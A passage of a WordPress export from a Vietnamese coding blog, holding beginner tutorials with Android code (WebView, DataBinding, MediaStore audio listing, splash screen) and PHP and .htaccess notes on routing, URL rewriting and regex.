        if (msg.what == WHAT_FINISH_DOWNLOAD) {
            String path = msg.obj.toString();

            Toast.makeText(MainActivity.this, path, Toast.LENGTH_SHORT).show();
            btnDownload.setEnabled(true);
        }
    }
};
</h2>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>395</wp:post_id>
		<wp:post_date><![CDATA[2020-06-30 22:53:21]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-06-30 22:53:21]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-06-30 22:53:21]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-06-30 22:53:21]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[download-file-online]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[WebView]]></title>
		<link>https://duycode.com/2020/06/30/webview/</link>
		<pubDate>Tue, 30 Jun 2020 23:23:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=399</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Cấp quyền Internet cho ứng dụng</h2>
<pre>
<uses-permission android:name="android.permission.INTERNET"/>
</pre>

<h2>2. Tạo Layout: activity_web_view.xml</h2>
<pre>
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:orientation="vertical"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".WebViewActivity">

    <WebView
        android:id="@+id/web_view"
        android:layout_width="match_parent"
        android:layout_height="match_parent"/>

</LinearLayout>
</pre>

<h2>3. Tạo Class: WebViewActivity</h2>
<pre>
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class WebViewActivity extends AppCompatActivity {
    private WebView webView;
    private String newsURL;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.getSupportActionBar().hide();
        setContentView(R.layout.activity_web_view);

        Intent intent = getIntent();
        newsURL = intent.getStringExtra("EXTRA_URL_LINK");
        initView();
    }

    private void initView() {
        webView = findViewById(R.id.web_view);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl(newsURL);
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()){
            webView.goBack();
        }
        else {
            super.onBackPressed();
        }
    }
}
</pre>

<h2>4. Sử dụng</h2>
<pre>
String pathOffline = "/TestDownload/" + "file_name" + ".html";
String linkOffline = "file:///"+ pathOffline;
String linkOnline = "https://www.google.com/";
Intent webViewIntent = new Intent(mainActivity, WebViewActivity.class);
webViewIntent.putExtra("EXTRA_URL_LINK", linkOnline);
//webViewIntent.putExtra("EXTRA_URL_LINK", linkOffline);
startActivity(webViewIntent);
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>399</wp:post_id>
		<wp:post_date><![CDATA[2020-06-30 23:23:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-06-30 23:23:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-06-30 23:23:00]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-06-30 23:23:00]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[webview]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[DataBinding - MVVM]]></title>
		<link>https://duycode.com/2020/07/01/databinding-mvvm/</link>
		<pubDate>Wed, 01 Jul 2020 19:14:05 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=410</guid>
		<description></description>
		<content:encoded><![CDATA[1. build.grade
<pre>
dataBinding {
    enabled = true
}
</pre>

<h2>Tại MainActivity.class</h2>
<pre>
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = DataBindingUtil.setContentView(this,
                R.layout.activity_main);
        //setContentView(R.layout.activity_main);
        init();
    }
</pre>

<h2>Tại FragmentActivity.class</h2>
<pre>
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        frBinding = DataBindingUtil.inflate(
                inflater,
                R.layout.fragment_song,
                container,
                false);
        View view = frBinding.getRoot();
        return view;
    }
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>410</wp:post_id>
		<wp:post_date><![CDATA[2020-07-01 19:14:05]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-07-01 19:14:05]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-07-01 19:14:05]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-07-01 19:14:05]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[databinding-mvvm]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Get Audio From INTERNAL_CONTENT_URI]]></title>
		<link>https://duycode.com/2020/07/03/get-audio-from-internal_content_uri/</link>
		<pubDate>Fri, 03 Jul 2020 20:33:47 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=414</guid>
		<description></description>
		<content:encoded><![CDATA[-- Giả sử ta cần lấy List Audio từ bộ nhớ máy--
<h2>1. Tạo Class: Song </h2>
<pre>
public class Song {
    private String data;
    private int size;
    private String title;
    private int duration;
    private String artist;
    private String album;
    private Bitmap thumbnail;

    // thêm Getter và Setter nhé ...
}
</pre>
<h2>2. Tạo Class: SystemAudio </h2>
<pre>
package com.example.miniaudioplayer.utils;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.MediaStore;

import com.example.miniaudioplayer.model.Song;

import java.util.ArrayList;

public class SystemAudio {
    private ContentResolver resolver;

    public SystemAudio(Context context) {
        this.resolver = context.getContentResolver();
    }

    public ArrayList<Song> getAudioList(){
        ArrayList<Song> songs = new ArrayList<>();
        Cursor cursor = resolver.query(
                MediaStore.Audio.Media.INTERNAL_CONTENT_URI,
                null,
                null,
                null,
                null
        );
        // Một vài URI khác để sử dụng:
        // ContactsContract.Contacts.CONTENT_URI
        // Telephony.Sms.CONTENT_URI
        // CallLog.CONTENT_URI
        // MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
        // MediaStore.Audio.Media.INTERNAL_CONTENT_URI

        cursor.moveToFirst();

        int indexData = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.DATA);
        int indexSize = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.SIZE);
        int indexTitle = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.TITLE);
        int indexDuration = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.DURATION);
        int indexArtist = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.ARTIST);
        int indexAlbum = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.ALBUM);

        while (cursor.isAfterLast() == false) {
            // Để xem chi tiết các thuộc tính của Audio, có thể Log ra để nhìn:
            // for (int i = 0; i < cursor.getColumnCount(); i++) {
            //    Log.e(cursor.getColumnName(i), cursor.getString(i) + "");
            // }
            // Log.e("=======================", "========================= ");

            String data = cursor.getString(indexData);
            int size = cursor.getInt(indexSize);
            int duration = cursor.getInt(indexDuration);
            String title = cursor.getString(indexTitle);
            String artist = cursor.getString(indexArtist);
            String album = cursor.getString(indexAlbum);
            Bitmap thumbnail = takeBitmapFromData(data);

            Song song = new Song();
            song.setAlbum(album);
            song.setArtist(artist);
            song.setData(data);
            song.setDuration(duration);
            song.setSize(size);
            song.setTitle(title);
            newSong.setThumbnail(thumbnail);
        
            songs.add(song);
            cursor.moveToNext();
        }
        cursor.close();
        return songs;
    }

    public Bitmap takeBitmapFromData(String linkData){
        MediaMetadataRetriever mmr = new MediaMetadataRetriever();
        mmr.setDataSource(linkData);
        byte [] data = mmr.getEmbeddedPicture();
        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
        return bitmap;
    }
}
</pre>

<h2>3. Tại MainActivity.class </h2>
<pre>
    ArrayList<Song> songs;
    systemAudio = new SystemAudio(this);
    songs = systemAudio.getAudioList();
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>414</wp:post_id>
		<wp:post_date><![CDATA[2020-07-03 20:33:47]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-07-03 20:33:47]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-07-03 20:33:47]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-07-03 20:33:47]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[get-audio-from-internal_content_uri]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Drawer Layout]]></title>
		<link>https://duycode.com/2020/07/08/drawer-layout/</link>
		<pubDate>Wed, 08 Jul 2020 10:55:55 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=423</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>423</wp:post_id>
		<wp:post_date><![CDATA[2020-07-08 10:55:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-07-08 10:55:55]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-07-08 10:55:55]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-07-08 10:55:55]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[drawer-layout]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Splash Screen Background]]></title>
		<link>https://duycode.com/2020/07/10/splash-screen-background/</link>
		<pubDate>Fri, 10 Jul 2020 21:54:28 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=425</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Tạo Drawable: splash_background.xml</h2>
- Tạo file: /app/res/drawable/splash_background.xml
<pre>
<?xml version="1.0" encoding="utf-8"?>
<layer-list
    xmlns:android="http://schemas.android.com/apk/res/android">
    <item
        android:drawable="@color/colorPrimary"/>

    <item
        android:drawable="@mipmap/ic_launcher"
        android:gravity="center"/>

</layer-list>
</pre>

<h2>2. Thêm SplashTheme trong Styles</h2>
- Sửa file: /app/res/values/styles.xml
<pre>
<resources>
    <!-- Base application theme. -->
    <style name="AppTheme" parent="Theme.AppCompat.Light.DarkActionBar">
        <!-- Customize your theme here. -->
        <item name="colorPrimary">@color/colorPrimary</item>
        <item name="colorPrimaryDark">@color/colorPrimaryDark</item>
        <item name="colorAccent">@color/colorAccent</item>
    </style>

    <style name="SplashTheme" parent="Theme.AppCompat.DayNight.NoActionBar">
        <item name="android:windowBackground">@drawable/splash_background</item>
    </style>
</resources>
</pre>
<h2>3. Tạo Activity: SplashScreenActivity</h2>
<pre>
package com.example.musicplayer;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;

public class SplashScreenActivity extends AppCompatActivity {
    private int splash_time_out = 500;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                Intent intent = new Intent(SplashScreenActivity.this,MainActivity.class);
                startActivity(intent);
                finish();
            }
        },splash_time_out);

    }
}
</pre>

<h2>4. Dùng SplashScreenActivity làm Activity khởi chạy app </h2>
- Sửa file: app/manifests/AndroidManifest.xml
<pre>
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.musicplayer">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">
        <activity
            android:theme="@style/SplashTheme"
            android:name=".SplashScreenActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity android:name=".PlayingActivity" />
        <activity android:name=".MainActivity">

        </activity>
    </application>

</manifest>
</pre>

<h2>5. Vấn đề khác</h2>
- SplashScreen sẽ mượt mà nhất khi chỉ set Theme cho Activity thôi.
- Nếu muốn SplashScreen có thêm tiến tình như ProgessBar, ... thì tại SplashScreenActivity phải setContentView như bình thường]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>425</wp:post_id>
		<wp:post_date><![CDATA[2020-07-10 21:54:28]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-07-10 21:54:28]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-07-10 21:54:28]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-07-10 21:54:28]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[splash-screen-background]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Media]]></title>
		<link>https://duycode.com/2020/07/13/media/</link>
		<pubDate>Mon, 13 Jul 2020 16:53:10 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=438</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Media Player</h2>
<img src="https://developer.android.com/images/mediaplayer_state_diagram.gif" alt="Media Player Life Cycle" />
<pre>
MediaPlayer mediaPlayer = MediaPlayer.create(this,R.raw.cho_toi_mot_co_hoi);
mediaPlayer.start();
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>438</wp:post_id>
		<wp:post_date><![CDATA[2020-07-13 16:53:10]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-07-13 16:53:10]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-07-13 16:53:10]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-07-13 16:53:10]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[media]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[PHP - Điều hướng website - Route]]></title>
		<link>https://duycode.com/2020/12/06/php-dieu-huong-website-route/</link>
		<pubDate>Sun, 06 Dec 2020 01:08:10 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=491</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Tạo file: controller/route.php</h2>
<pre>
<?php

class Controller
{
    public function invoke(){
        if($_GET['route']== ""){
            $this->home();
        }elseif($_GET['route']== 'home'){
            $this->listing();
        }elseif($_GET['route']== 'login'){
            // khi trỏ vào http://localhost/t1904a_php/?route=login thi sẽ xử lý hàm login
            $this->login();
        }else{
            echo "404 Not Found";
        }
    }

    public function home(){
        include_once("views/home.php");
    }

    public function listing(){
        include_once ("views/demo_database.php");
    }

    public function login(){
        include_once("views/login.php");
    }
}

$controller = new Controller();
$controller->invoke();

</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>491</wp:post_id>
		<wp:post_date><![CDATA[2020-12-06 01:08:10]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-06 01:08:10]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-06 01:08:10]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-06 01:08:10]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php-dieu-huong-website-route]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
						</item>
					<item>
		<title><![CDATA[htaccess toàn tập]]></title>
		<link>https://duycode.com/2020/12/06/htaccess-toan-tap/</link>
		<pubDate>Sun, 06 Dec 2020 08:13:43 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=498</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Kiểm tra cấu hình Apache</h2>
- .htaccess sẽ chậm hơn httpd.conf. Nếu apache cho phép, nên sử dụng httpd.con thay vì .htaccess
- Mở file: \apache\conf\httpd.conf
- Kiểm tra dòng này có hoạt động không
<blockquote>LoadModule rewrite_module modules/mod_rewrite.so</blockquote>
-&gt; không có dấu # là ok :D

<h2>2. Code mẫu .htaccess</h2>
<pre>
RewriteEngine On

RewriteCond %{REQUEST_FILENAME} !f
RewriteCond %{REQUEST_FILENAME} !d

#RewriteRule ^ index.php [L,QSA]
</pre>

# Bật tính năng Rewrite URL
<code>RewriteEngine On</code>

# Yêu cầu đường dẫn không được có file.
VD: đường dẫn có file .php như sau sẽ không thỏa mãn: http://localhost/frameworkphp/public/index.php
<code>RewriteCond %{REQUEST_FILENAME} !-f</code>

# Yêu cầu đường dẫn không được là thư mục có thật.
<code>RewriteCond %{REQUEST_FILENAME} !-d</code>

# Lệnh RewriteRule: RewriteRule "duong-dan-ao" "duong-dan-that"
# Đường dẫn thật là đường dẫn thư mục đặt file .htaccess. Trong php, thường đặt file .htaccess trong yourdomain/public
# Ví dụ: chuyển mọi đường dẫn đều thêm vào cuối: "index.php"
<code>RewriteRule ^ index.php [L,QSA]</code>


#RewriteRule "duong-dan-ao" "duong-dan-that"
#Vi du, duong dan ao la: "index=html" hoac "../../abc/123/index.html"
#Thi duong dan that la: "public/index.php"
#Tuy nhien "public/index.html" -&gt; "home.php"
RewriteRule "index.html" "public/index.php"
RewriteRule "public/index.html" "home.php"

#([0-9]+) tương ứng với biến $1, ([]) tương ứng với biến $2
RewriteRule "^user-edit/([0-9]+)$" "view/admin/user_edit.php?id=$1"
RewriteRule "^user-edit/([0-9]+)/([])$" "view/admin/user_edit.php?id_sp=$1&amp;ten_sp=$2"
</pre>

<h2>3. Các ký tự dùng riêng của htacess</h2>
<table>
<tbody>
<tr>
<td>#</td>
<td>Bắt đầu ghi ch&uacute;</td>
</tr>
<tr>
<td>[F]</td>
<td>Forrbidden - chỉ định server trả về&nbsp;client lỗi 403</td>
</tr>
<tr>
<td>[L]</td>
<td>Last rule - Ấn định rằng bước trước đ&atilde; xong th&igrave; ngừng v&agrave; kh&ocirc;ng tiếp tục lệnh rewrite nữa</td>
</tr>
<tr>
<td>[G]</td>
<td>Gone - chỉ định server trả về client trang b&aacute;o lỗi kh&ocirc;ng tồn tại</td>
</tr>
<tr>
<td>[NC]</td>
<td>No case - Chỉ định match k&yacute; tự kh&ocirc;ng ph&acirc;n biệt hoa - thường</td>
</tr>
<tr>
<td>[OR]</td>
<td>Hoặc</td>
</tr>
<tr>
<td>[QSA]</td>
<td>&nbsp;Append Query String: gắn chuỗi truy vấn v&agrave;o cuối c&ugrave;ng URL</td>
</tr>
<tr>
<td>-d</td>
<td>Kiểm tra thư mục c&oacute; tồn tại kh&ocirc;ng.</td>
</tr>
<tr>
<td>-f</td>
<td>Kiểm tra file c&oacute; tồn tại kh&ocirc;ng.</td>
</tr>
<tr>
<td>-s</td>
<td>Kiểm tra file c&oacute; kh&aacute;c 0 hay kh&ocirc;ng.</td>
</tr>
<tr>
<td>-l&nbsp;</td>
<td>Kiểm tra link</td>
</tr>
</tbody>
</table>

<h2>4. Regex trong .htaccess</h2>
<table>
<tbody>
<tr>
<td>^</td>
<td>Bắt đầu chuỗi Regex</td>
</tr>
<tr>
<td>$</td>
<td>Kết th&uacute;c chuỗi Regex V&iacute; dụ: ^&amp; : định nghĩa chuỗi rỗng</td>
</tr>
<tr>
<td>[]</td>
<td>- Tập hợp c&aacute;c k&yacute; tự trong đ&oacute;.<br />[abc] =&gt; chỉ chấp nhận k&yacute; tự a hoặc b hoặc c<br />[a-e] =&gt; chỉ chấp nhận k&yacute; tự thường từ a đến e, tương tự [abcde]<br />[F-K] =&gt; chỉ chấp nhận k&yacute; tự hoa từ F đến K, tương tự [FGHIJK]<br />[a-zA-Z0-9] =&gt; chấp nhận c&aacute;c chữ c&aacute;i thường, hoa, v&agrave; số</td>
</tr>
<tr>
<td>{}</td>
<td>- X&aacute;c định chiều d&agrave;i cho chuỗi<br />[A-Z]{8} =&gt;&nbsp;c&aacute;c k&yacute; tự từ A tới Z, d&agrave;i 8 k&yacute; tự<br />[a-z]{5,10} =&gt; c&aacute;c k&yacute; tự từ a tới z, d&agrave;i từ 5 đến 10 k&yacute; tự<br />[0-9]{2,} =&gt; k&yacute; tự số, d&agrave;i &iacute;t nhất 2 k&yacute; tự<br /><br /></td>
</tr>
<tr>
<td>.</td>
<td>- Bất cứ k&yacute; tự đơn n&agrave;o<br />.{10,20} =&gt; chuỗi k&yacute; tự bất kỳ, d&agrave;i từ 10 đến 20 k&yacute; tự</td>
</tr>
<tr>
<td>+</td>
<td>- Từ 1 k&yacute; tự trở l&ecirc;n, tương tự {1,}<br />[a-z]+ =&gt; chuỗi c&aacute;c k&yacute; tự chữ c&aacute;i thường, c&oacute; &iacute;t nhất 1 k&yacute; tự</td>
</tr>
<tr>
<td>*</td>
<td>- C&oacute; 0 hoặc nhiều k&yacute; tự, tương tự {}<br />[A-Z]* =&gt; chuỗi c&aacute;c k&yacute; tự chữ c&aacute;i thường, d&agrave;i từ 0 k&yacute; tự trở l&ecirc;n<br /> .*&nbsp; =&gt; kh&ocirc;ng c&oacute; k&yacute; tự n&agrave;o hoặc nhiều k&yacute; tự bất kỳ.<br /> ^.*$ =&gt; sử dụng match với mọi thứ</td>
</tr>
<tr>
<td>?</td>
<td>- C&oacute; 0 hoặc 1 k&yacute; tự, tương tự {0,1}<br />[a-z]? =&gt; chuỗi c&aacute;c k&yacute; tự chữ c&aacute;i thường, c&oacute; &iacute;t nhất 1 k&yacute; tự</td>
</tr>
<tr>
<td>[^]</td>
<td>- Ngược lại với []<br />[^a-z]{5,10} =&gt; chuỗi d&agrave;i từ 5 đến 10 k&yacute; tự, nhưng kh&ocirc;ng c&oacute; cữ c&aacute;i thường từ a-z n&agrave;o<br />[^abc]{} =&gt; so khớp với chuỗi kh&ocirc;ng chứa chữ c&aacute;i a,b v&agrave; c</td>
</tr>
<tr>
<td>()</td>
<td>- Nh&oacute;m c&aacute;c k&yacute; tự th&agrave;nh 1 nh&oacute;m</td>
</tr>
<tr>
<td>|</td>
<td>- Hoặc<br />(a|b) =&gt; k&yacute; tự a hoặc b<br />(duycode|htaccess) =&gt; chuỗi duycode hoặc htaccess</td>
</tr>
<tr>
<td>\</td>
<td>- D&ugrave;ng để đặt trước c&aacute;c k&yacute; tự đặc biệt<br />\\ =&gt; k&yacute; tự \<br />\. =&gt; k&yacute; tự .</td>
</tr>
<tr>
<td>!</td>
<td>Phủ định</td>
</tr>
</tbody>
</table>

<h2>5. Những lỗi do file htaccess thường gặp</h2>
<blockquote>301 - Moved Permanently: 302 - Moved Temporarily: Lỗi truy cập vào trang đã bị di chuyển.
400 – Bad request (Lỗi request)
401 – Authorization Required (lỗi xác thực user,password)
403 – Forbidden (không được vào, trang bị cấm)
404 – Wrong page (lỗi trang, không tìm thấy…)
500 – Internal Server Error (lỗi server)</blockquote>

<h2>6. Function PHP sửa URL</h2>
- Ta có đường dẫn: https://duycode.com/Hãy Cho Tôi Năm Nghìn
- Chuyển thành: https://duycode.com/hay-cho-toi-nam-nghin
<pre>function makeURL($string){
    $string=trim($string);
    $string=str_replace(' ','-',$string);
    $string=strtolower($string);
    $string=preg_replace('/(ù|ú|ủ|ũ|ụ|ư|ừ|ứ|ử|ữ|ự)/','u',$string);
    $string=preg_replace('/(è|é|ẻ|ẽ|ẹ|ê|ề|ế|ể|ễ|ệ)/','e',$string);
    $string=preg_replace('/(ò|ó|ỏ|õ|ọ|ô|ồ|ố|ổ|ỗ|ộ|ơ|ờ|ớ|ở|ỡ|ợ)/','o',$string);
    $string=preg_replace('/(à|á|ả|ã|ạ|ă|ằ|ắ|ẳ|ẵ|ặ|â|ầ|ấ|ẩ|ẫ|ậ)/','a',$string);
    $string=preg_replace('/(ì|í|ỉ|ĩ|ị)/','i',$string);
    $string=preg_replace('/đ/','d',$string);
    return $string;
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>498</wp:post_id>
		<wp:post_date><![CDATA[2020-12-06 08:13:43]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-06 08:13:43]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-06 08:13:43]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-06 08:13:43]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[htaccess-toan-tap]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
						</item>
					<item>
		<title><![CDATA[Các biến định nghĩa trước trong PHP]]></title>
		<link>https://duycode.com/2020/12/06/url-trong-php/</link>
		<pubDate>Sun, 06 Dec 2020 20:20:16 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=516</guid>
		<description></description>
		<content:encoded><![CDATA[Trong PHP có một số loại biến gọi là siêu toàn cục superglobal, nó đã được PHP định nghĩa trước, bạn có thể truy cập bất kỳ lúc nào, và phạm vi truy cập là bất kỳ đâu.
 Hiện tại đó là các biến siêu toàn cục có tên sau: $_SERVER, $GLOBALS, $_REQUEST, $_POST, $_GET, $_FILES, $_ENV, $_COOKIE, $_SESSION

<h2>1. Biến $_SERVER</h2>
$_SERVER là một mảng chứa các thông tin do Webserver sinh ra như header, path, location script. 
<table>
<tbody>
<tr>
<td>$_SERVER['QUERY_STRING']</td>
